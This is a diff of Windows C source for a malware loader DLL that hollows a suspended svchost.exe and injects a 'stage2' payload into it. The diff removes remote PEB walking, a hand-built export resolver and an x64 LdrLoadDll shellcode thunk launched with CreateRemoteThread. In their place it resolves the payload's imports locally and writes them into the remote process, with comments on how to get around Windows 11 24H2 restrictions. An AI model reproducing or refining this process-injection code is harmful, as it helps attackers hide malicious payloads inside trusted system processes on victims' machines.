@@ -17,7 +17,6 @@ typedef struct _PROCESS_BASIC_INFORMATION {
 } PROCESS_BASIC_INFORMATION;
 
 typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
-typedef NTSTATUS (NTAPI *PNtLdrLoadDll)(PWSTR, PULONG, LPVOID, PHANDLE);
 
 static void LogMessage(LPCWSTR msg) {
     HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -99,249 +98,20 @@ static BOOL ApplyRelocations(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS
     return TRUE;
 }
 
-// Find a DLL's base in the remote process by walking PEB->Ldr->InMemoryOrderModuleList.
-// PEB.Ldr is at offset 0x18 on x64; PEB_LDR_DATA.InMemoryOrderModuleList head is
-// at offset 0x20. LDR_DATA_TABLE_ENTRY layout on x64:
-//   0x00 InLoadOrderLinks  0x10 InMemoryOrderLinks  0x20 InInitializationOrderLinks
-//   0x30 DllBase  0x38 EntryPoint  0x40 SizeOfImage  0x48 FullDllName  0x58 BaseDllName
-// InMemoryOrderLinks.LDR offsets: Length 0x58, MaxLength 0x5A, Buffer 0x60.
-static LPVOID FindRemoteDllBase(HANDLE hProc, LPVOID remotePeb, const wchar_t* dllName) {
-    LPVOID ldrAddr = NULL;
-    if (!ReadProcessMemory(hProc, (LPBYTE)remotePeb + 0x18, &ldrAddr, sizeof(ldrAddr), NULL) || !ldrAddr) return NULL;
-
-    LPVOID head = (LPBYTE)ldrAddr + 0x20;
-    LPVOID entryLE = NULL;
-    if (!ReadProcessMemory(hProc, head, &entryLE, sizeof(entryLE), NULL)) return NULL;
-
-    int maxIter = 512;
-    while (entryLE != head && maxIter-- > 0) {
-        LPBYTE ldrEntry = (LPBYTE)entryLE - 0x10;
-
-        LPVOID dllBase = NULL;
-        USHORT nameLen = 0;
-        PWSTR nameBuf = NULL;
-        ReadProcessMemory(hProc, ldrEntry + 0x30, &dllBase, sizeof(dllBase), NULL);
-        ReadProcessMemory(hProc, ldrEntry + 0x58, &nameLen, sizeof(nameLen), NULL);
-        ReadProcessMemory(hProc, ldrEntry + 0x60, &nameBuf, sizeof(nameBuf), NULL);
-
-        if (nameBuf && nameLen > 0 && nameLen < 512) {
-            wchar_t name[256];
-            ReadProcessMemory(hProc, nameBuf, name, nameLen, NULL);
-            name[nameLen / sizeof(wchar_t)] = 0;
-            if (_wcsicmp(name, dllName) == 0) return dllBase;
-        }
-
-        if (!ReadProcessMemory(hProc, entryLE, &entryLE, sizeof(entryLE), NULL)) return NULL;
-    }
-    return NULL;
-}
-
-// Load a DLL into the remote process when the suspended-and-hollowed svchost
-// doesn't have it mapped. On Win10 the suspended child has ntdll+kernel32+
-// kernelbase preloaded, so kernel32!LoadLibraryW reached via CreateRemoteThread
-// works. On Win11 24H2 / Tiny11 the suspended child only has ntdll mapped by
-// the time we get there, so the LoadLibraryW address we resolve in the parent
-// (loader process) lands in unmapped memory in the remote and the thread faults
-// before it can load anything. Primary path uses ntdll!LdrLoadDll (guaranteed
-// mapped in any suspended process) through a tiny x64 shellcode thunk —
-// CreateRemoteThread only threads one parameter but LdrLoadDll takes four.
-// LoadLibraryW is kept as a fallback for older hosts (and so the technique
-// remains documented). ntdll/kernel32 are system-wide base (per-boot ASLR),
-// so the addresses we resolve in the parent are valid in the remote.
-//
-// Remote buffer layout (x64):
-//   0x00 PWSTR           DllPath          = NULL
-//   0x08 ULONG           Flags            = 0
-//   0x10 UNICODE_STRING  ModuleName { USHORT Length; USHORT Max; [pad]; PWSTR Buffer }
-//   0x20 HANDLE          ModuleHandle out = 0
-//   0x28 shellcode thunk (~41 bytes)
-//   0x58 wide name buffer
-static LPVOID LoadLibraryInRemote(HANDLE hProc, const wchar_t* dllName, LPVOID remotePeb) {
-    LPVOID base = FindRemoteDllBase(hProc, remotePeb, dllName);
-    if (base) return base;
-
-    int nameLenW = lstrlenW(dllName);
-    if (nameLenW <= 0 || nameLenW > 256) return NULL;
-
-    // x64 thunk:
-    //   sub  rsp, 0x28
-    //   mov  rax, rcx             ; arg
-    //   mov  rcx, [rax]           ; DllPath = NULL
-    //   xor  edx, edx
-    //   mov  edx, [rax+8]         ; Flags
-    //   lea  r8,  [rax+0x10]      ; &ModuleName (inline UNICODE_STRING)
-    //   lea  r9,  [rax+0x20]      ; &ModuleHandle
-    //   mov  r11, <imm64 LdrLoadDll>
-    //   call r11
-    //   add  rsp, 0x28
-    //   ret
-    // imm64 must be patched in at offset 0x15 within the thunk.
-    static const unsigned char kThunk[] = {
-        0x48, 0x83, 0xEC, 0x28,
-        0x48, 0x89, 0xC8,
-        0x48, 0x8B, 0x08,
-        0x31, 0xD2,
-        0x8B, 0x50, 0x08,
-        0x4C, 0x8D, 0x40, 0x10,
-        0x4C, 0x8D, 0x48, 0x20,
-        0x49, 0xBB, 0,0,0,0,0,0,0,0,
-        0x41, 0xFF, 0xD3,
-        0x48, 0x83, 0xC4, 0x28,
-        0xC3
-    };
-    enum { THUNK_SIZE = sizeof(kThunk), IMM_OFF = 25, NAME_OFF = 0x58 };
-
-    SIZE_T strBytes = (SIZE_T)(nameLenW + 1) * sizeof(wchar_t);
-    SIZE_T total = NAME_OFF + strBytes + 0x10;
-
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    PNtLdrLoadDll pLdr = (PNtLdrLoadDll)GetProcAddress(hNtdll, "LdrLoadDll");
-
-    LPVOID remote = VirtualAllocEx(hProc, NULL, total, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (!remote) return NULL;
-
-    LPBYTE local = (LPBYTE)LocalAlloc(LPTR, total);
-    if (!local) { VirtualFreeEx(hProc, remote, 0, MEM_RELEASE); return NULL; }
-
-    USHORT usLen = (USHORT)(nameLenW * sizeof(wchar_t));
-    USHORT usMax = (USHORT)(usLen + sizeof(wchar_t));
-    memcpy(local + 0x10, &usLen, sizeof(usLen));
-    memcpy(local + 0x12, &usMax, sizeof(usMax));
-    ULONG_PTR strRemote = (ULONG_PTR)remote + NAME_OFF;
-    memcpy(local + 0x18, &strRemote, sizeof(strRemote));
-    memcpy(local + NAME_OFF, dllName, strBytes);
-
-    LPVOID result = NULL;
-
-    if (pLdr) {
-        memcpy(local + 0x28, kThunk, THUNK_SIZE);
-        ULONG_PTR ldrAddr = (ULONG_PTR)pLdr;
-        memcpy(local + 0x28 + IMM_OFF, &ldrAddr, sizeof(ldrAddr));
-
-        SIZE_T written = 0;
-        WriteProcessMemory(hProc, remote, local, total, &written);
-
-        LPTHREAD_START_ROUTINE sc = (LPTHREAD_START_ROUTINE)((LPBYTE)remote + 0x28);
-        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, sc, remote, 0, NULL);
-        if (hThread) {
-            WaitForSingleObject(hThread, 15000);
-            DWORD ret = 0;
-            GetExitCodeThread(hThread, &ret);
-            CloseHandle(hThread);
-            result = FindRemoteDllBase(hProc, remotePeb, dllName);
-            if (!result) {
-                wchar_t dbg[256];
-                wsprintfW(dbg, L"[*] IAT: LdrLoadDll thunk ret=0x%08lx for %s", ret, dllName);
-                LogMessage(dbg);
-            }
-        } else {
-            wchar_t dbg[256];
-            wsprintfW(dbg, L"[*] IAT: CreateRemoteThread(LdrLoadDll) err=%lu for %s", GetLastError(), dllName);
-            LogMessage(dbg);
-        }
-    } else {
-        LogMessage(L"[*] IAT: ntdll!LdrLoadDll not resolved — trying LoadLibraryW fallback");
-    }
-
-    if (!result) {
-        size_t nameSize = (lstrlenW(dllName) + 1) * sizeof(wchar_t);
-        LPVOID remoteName = VirtualAllocEx(hProc, NULL, nameSize, MEM_COMMIT, PAGE_READWRITE);
-        if (remoteName) {
-            SIZE_T written = 0;
-            WriteProcessMemory(hProc, remoteName, dllName, nameSize, &written);
-            HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
-            LPTHREAD_START_ROUTINE pLoad = (LPTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryW");
-            HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoad, remoteName, 0, NULL);
-            if (hThread) {
-                WaitForSingleObject(hThread, 10000);
-                DWORD ret = 0;
-                GetExitCodeThread(hThread, &ret);
-                CloseHandle(hThread);
-                result = FindRemoteDllBase(hProc, remotePeb, dllName);
-                if (!result) {
-                    wchar_t dbg[256];
-                    wsprintfW(dbg, L"[*] IAT: LoadLibraryW thunk ret=%p err=%lu for %s", (LPVOID)(ULONG_PTR)ret, GetLastError(), dllName);
-                    LogMessage(dbg);
-                }
-            } else {
-                wchar_t dbg[256];
-                wsprintfW(dbg, L"[*] IAT: CreateRemoteThread(LoadLibraryW) err=%lu for %s", GetLastError(), dllName);
-                LogMessage(dbg);
-            }
-            VirtualFreeEx(hProc, remoteName, 0, MEM_RELEASE);
-        }
-    }
-
-    LocalFree(local);
-    VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
-    return result;
-}
-
-// Find an exported function by name in a remote DLL.
-// Returns NULL if the export is forwarded (a known limitation — forwarded
-// exports need the forwarder DLL to be loaded and re-resolved, not in scope).
-static LPVOID FindExportByName(HANDLE hProc, LPVOID dllBase, const char* funcName) {
-    IMAGE_DOS_HEADER dosH;
-    if (!ReadProcessMemory(hProc, dllBase, &dosH, sizeof(dosH), NULL)) return NULL;
-    if (dosH.e_magic != IMAGE_DOS_SIGNATURE) return NULL;
-
-    IMAGE_NT_HEADERS ntH;
-    if (!ReadProcessMemory(hProc, (LPBYTE)dllBase + dosH.e_lfanew, &ntH, sizeof(ntH), NULL)) return NULL;
-    if (ntH.Signature != IMAGE_NT_SIGNATURE) return NULL;
-
-    IMAGE_DATA_DIRECTORY exportDir = ntH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    if (exportDir.Size == 0) return NULL;
-
-    IMAGE_EXPORT_DIRECTORY expDir;
-    if (!ReadProcessMemory(hProc, (LPBYTE)dllBase + exportDir.VirtualAddress, &expDir, sizeof(expDir), NULL)) return NULL;
-    if (expDir.NumberOfNames == 0 || expDir.NumberOfFunctions == 0) return NULL;
-
-    DWORD nNames = expDir.NumberOfNames;
-    DWORD nFuncs = expDir.NumberOfFunctions;
-
-    DWORD* names = (DWORD*)LocalAlloc(LPTR, nNames * sizeof(DWORD));
-    WORD* ordinals = (WORD*)LocalAlloc(LPTR, nNames * sizeof(WORD));
-    DWORD* funcs = (DWORD*)LocalAlloc(LPTR, nFuncs * sizeof(DWORD));
-    if (!names || !ordinals || !funcs) {
-        if (names) LocalFree(names);
-        if (ordinals) LocalFree(ordinals);
-        if (funcs) LocalFree(funcs);
-        return NULL;
-    }
-
-    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfNames, names, nNames * sizeof(DWORD), NULL);
-    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfNameOrdinals, ordinals, nNames * sizeof(WORD), NULL);
-    ReadProcessMemory(hProc, (LPBYTE)dllBase + expDir.AddressOfFunctions, funcs, nFuncs * sizeof(DWORD), NULL);
-
-    LPVOID result = NULL;
-    for (DWORD i = 0; i < nNames; i++) {
-        char nameBuf[256] = {0};
-        ReadProcessMemory(hProc, (LPBYTE)dllBase + names[i], nameBuf, sizeof(nameBuf) - 1, NULL);
-        nameBuf[sizeof(nameBuf) - 1] = 0;
-        if (lstrcmpA(nameBuf, funcName) == 0) {
-            WORD ord = ordinals[i];
-            if (ord < nFuncs) {
-                DWORD funcRva = funcs[ord];
-                if (funcRva >= exportDir.VirtualAddress && funcRva < exportDir.VirtualAddress + exportDir.Size) {
-                    break;  // forwarded — bail
-                }
-                result = (LPBYTE)dllBase + funcRva;
-            }
-            break;
-        }
-    }
-
-    LocalFree(names);
-    LocalFree(ordinals);
-    LocalFree(funcs);
-    return result;
-}
-
-// Walk stage2's import table. For each DLL referenced, find the matching
-// remote DLL base (must already be loaded in the target process) and resolve
-// every imported function by name, writing the address to the remote IAT.
-// Ordinal imports are flagged and rejected (not used in this scenario).
-static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, LPVOID remotePeb) {
+// ponytail: Resolve stage2's IAT by loading each dependency DLL *in our own
+// process* and writing GetProcAddress results to the remote IAT via
+// WriteProcessMemory. No CreateRemoteThread, no remote PEB walking, no
+// shellcode thunk. System DLLs (advapi32, winhttp, netapi32, ws2_32, shell32,
+// crypt32, etc.) use system-wide ASLR: they load at the same base in every
+// process for the boot session, so an address resolved in loader.dll's
+// process is valid inside the hollowed svchost.exe. Win11 24H2 / Tiny11
+// rejects CreateRemoteThread on a CREATE_SUSPENDED child that hasn't completed
+// loader init (err 998, ERROR_NOACCESS), so the previous remote-thread
+// approach is dead on modern Windows. GetProcAddress resolves forwarders
+// automatically, which the old hand-rolled remote export walker could not.
+// Ceiling: if a payload ever needs a non-system DLL (per-process ASLR), this
+// breaks — would need manual remote mapping. All stage2 deps are system DLLs.
+static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf) {
     PIMAGE_DATA_DIRECTORY importDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (importDir->Size == 0) { LogMessage(L"[*] no import directory"); return TRUE; }
 
@@ -357,33 +127,20 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
         wsprintfW(dbg, L"[*] IAT: resolving DLL %d: %s", dllCount, dllName);
         LogMessage(dbg);
 
-        LPVOID remoteDllBase = FindRemoteDllBase(hProc, remotePeb, dllName);
-        if (!remoteDllBase) {
-            // Suspended-and-hollowed svchost only has ntdll/kernel32/kernelbase
-            // mapped; the loader hasn't run. Inject the missing DLL by spawning
-            // a remote thread that calls kernel32!LoadLibraryW, then re-scan PEB.
-            wsprintfW(dbg, L"[*] IAT: %s not mapped — loading via remote thread", dllName);
-            LogMessage(dbg);
-            remoteDllBase = LoadLibraryInRemote(hProc, dllName, remotePeb);
-            if (!remoteDllBase) {
-                wchar_t buf[256];
-                wsprintfW(buf, L"[-] IAT: failed to load %s into remote process", dllName);
-                LogMessage(buf);
-                return FALSE;
-            }
-            wsprintfW(dbg, L"[+] IAT: %s loaded at %p", dllName, remoteDllBase);
-            LogMessage(dbg);
-        } else {
-            wsprintfW(dbg, L"[+] IAT: %s found at %p", dllName, remoteDllBase);
-            LogMessage(dbg);
+        HMODULE hLocal = LoadLibraryW(dllName);
+        if (!hLocal) {
+            wchar_t buf[256];
+            wsprintfW(buf, L"[-] IAT: failed to load %s locally (err=%lu)", dllName, GetLastError());
+            LogMessage(buf);
+            return FALSE;
         }
+        wsprintfW(dbg, L"[+] IAT: %s at %p (system-wide base, valid in remote)", dllName, hLocal);
+        LogMessage(dbg);
 
-        // ILT (OriginalFirstThunk) may be 0 in some PEs; fall back to IAT (FirstThunk).
         DWORD oltRva = import->OriginalFirstThunk ? import->OriginalFirstThunk : import->FirstThunk;
         PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localBuf + RvaToFileOffset(ntH, oltRva));
         LPBYTE remoteIat = (LPBYTE)remoteImage + import->FirstThunk;
         for (; thunk->u1.AddressOfData; thunk++, remoteIat += sizeof(PVOID)) {
-            LPVOID funcAddr = NULL;
             if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                 wchar_t buf[256];
                 wsprintfW(buf, L"[-] IAT: ordinal import not supported: %s!%lu", dllName, (thunk->u1.Ordinal & 0xFFFF));
@@ -391,7 +148,7 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
                 return FALSE;
             }
             PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(localBuf + RvaToFileOffset(ntH, thunk->u1.AddressOfData));
-            funcAddr = FindExportByName(hProc, remoteDllBase, (const char*)ibn->Name);
+            LPVOID funcAddr = (LPVOID)GetProcAddress(hLocal, (LPCSTR)ibn->Name);
             if (!funcAddr) {
                 wchar_t buf[256];
                 wsprintfW(buf, L"[-] IAT: export not found: %s!%s", dllName, ibn->Name);
@@ -536,7 +293,7 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     }
 
     LogMessage(L"[*] calling ResolveImports");
-    if (!ResolveImports(pi.hProcess, remoteImage, ntH, stage2Buf, pbi.PebBaseAddress)) {
+    if (!ResolveImports(pi.hProcess, remoteImage, ntH, stage2Buf)) {
         LogMessage(L"[-] IAT resolution failed");
         LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
         return;
